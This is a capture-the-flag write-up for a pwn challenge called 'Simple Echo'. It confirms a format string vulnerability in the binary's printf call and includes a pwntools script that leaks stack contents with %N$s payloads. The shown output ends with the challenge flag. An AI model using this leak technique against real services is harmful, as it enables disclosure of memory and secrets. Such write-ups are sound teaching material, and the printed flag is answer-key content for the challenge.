# Simple Echo

Category: Pwn

## Description

> A simple program to echo back user input. What could possibly go wrong?

A binary file was attached.

## Solution

Let's run the file:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Simple_Echo]
└─$ ./chal
Type input to be echoed: test
Echoed output:
test
```

This program echos back the input we give it, as expected. If it uses `printf` to do that,
it might be vulnerable to a format string vulnerability:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Simple_Echo]
└─$ ./chal
Type input to be echoed: %p.%p
Echoed output:
0x55db7076c2a0.(nil)
```

Seems like it is. Let's check the decompilation via Ghidra:

```c

undefined8 main(void)
{
  char local_48 [64];
  
  printf("Type input to be echoed: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_0010201e,local_48);
  puts("Echoed output: ");
  printf(local_48);
  return 0;
}
```

Frankly, there's not much to work with here, apart from simply trying to explore the stack.
So let's do that with the following script:

```python
# First, generate a pwntools template with:
# $ pwn template --host simple-echo.2024-bq.ctfcompetition.com --port 1337 ./chal

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

def read_from_stack_offset(offset, format): 
    with context.local(log_level='ERROR'): 
        payload = f'%{str(offset)}${format}'
        io = start()
        io.recvuntilS(b"Type input to be echoed: ")
        io.sendline(payload.encode())
        res = io.recvall()
        res = res[len("Echoed output: \n"):]
        if res == b'(null)':
            return b'\x00'
        
        return res

MAX_DEPTH = 256

print("\nStack content:\n")

for i in range(1, MAX_DEPTH):
    address = read_from_stack_offset(i, 'x')
    content = read_from_stack_offset(i, 's')

    if content == b"":
        continue

    address = int(address, 16)
    print(f"{address:08X}: {content}\n          {content.hex(' ')}\n")

    if b'CTF' in content:
        break
```

Run it, and we shortly get the flag:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Simple_Echo]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/google/Simple_Echo/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No

Stack content:

4816DA70: b'\x01'
          01

A1DDE2B0: b'%5$s\n'
          25 35 24 73 0a

EEECC6D8: b"\x8e/'Y\xfc\x7f"
          8e 2f 27 59 fc 7f

99530569: b'x86_64'
          78 38 36 5f 36 34

172A7080: b'1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTE1\xc01\xc9H\x8d=\xce'
          31 ed 49 89 d1 5e 48 89 e2 48 83 e4 f0 50 54 45 31 c0 31 c9 48 8d 3d ce

74806D90: b'\x89\xc7\xe8Y\xb8\x01'
          89 c7 e8 59 b8 01

00000000: b'\x00'
          00

3B1FD169: b'UH\x89\xe5H\x83\xecP\x89}\xbcH\x89u\xb0H\x8d\x05\x85\x0e'
          55 48 89 e5 48 83 ec 50 89 7d bc 48 89 75 b0 48 8d 05 85 0e

D727D798: b'\x8e\x7f\xfa5\xff\x7f'
          8e 7f fa 35 ff 7f

00000000: b'\x00'
          00

BA2FA018: b'\x8e\xff@\x0e\xfc\x7f'
          8e ff 40 0e fc 7f

3903F169: b'UH\x89\xe5H\x83\xecP\x89}\xbcH\x89u\xb0H\x8d\x05\x85\x0e'
          55 48 89 e5 48 83 ec 50 89 7d bc 48 89 75 b0 48 8d 05 85 0e

75314DD8: b' Q\xde\x19\x8f['
          20 51 de 19 8f 5b

A866F040: b'\xe0\x82Kn\xe3{'
          e0 82 4b 6e e3 7b

00000000: b'\x00'
          00

00000000: b'\x00'
          00

00000000: b'\x00'
          00

00000000: b'\x00'
          00

00000000: b'\x00'
          00

D8AEFE40: b'L\x8b=Y\x01\x1f'
          4c 8b 3d 59 01 1f

C6CFCDD8: b' \xf1,C\x0b\\'
          20 f1 2c 43 0b 5c

00000000: b'\x00'
          00

00000000: b'\x00'
          00

04129080: b'1\xedI\x89\xd1^H\x89\xe2H\x83\xe4\xf0PTE1\xc01\xc9H\x8d=\xce'
          31 ed 49 89 d1 5e 48 89 e2 48 83 e4 f0 50 54 45 31 c0 31 c9 48 8d 3d ce

79D73050: b'\x01'
          01

00000000: b'\x00'
          00

00000000: b'\x00'
          00

C23C40A1: b'\xf4f.\x0f\x1f\x84'
          f4 66 2e 0f 1f 84

7FCC3048: b'\x1c'
          1c

87F3EF8E: b'/flag/CTF{L3akIng_ArGv_wi7h_Vu1N3rabl3_PrInTf!}/chal'
          2f 66 6c 61 67 2f 43 54 46 7b 4c 33 61 6b 49 6e 67 5f 41 72 47 76 5f 77 69 37 68 5f 56 75 31 4e 33 72 61 62 6c 33 5f 50 72 49 6e 54 66 21 7d 2f 63 68 61 6c
```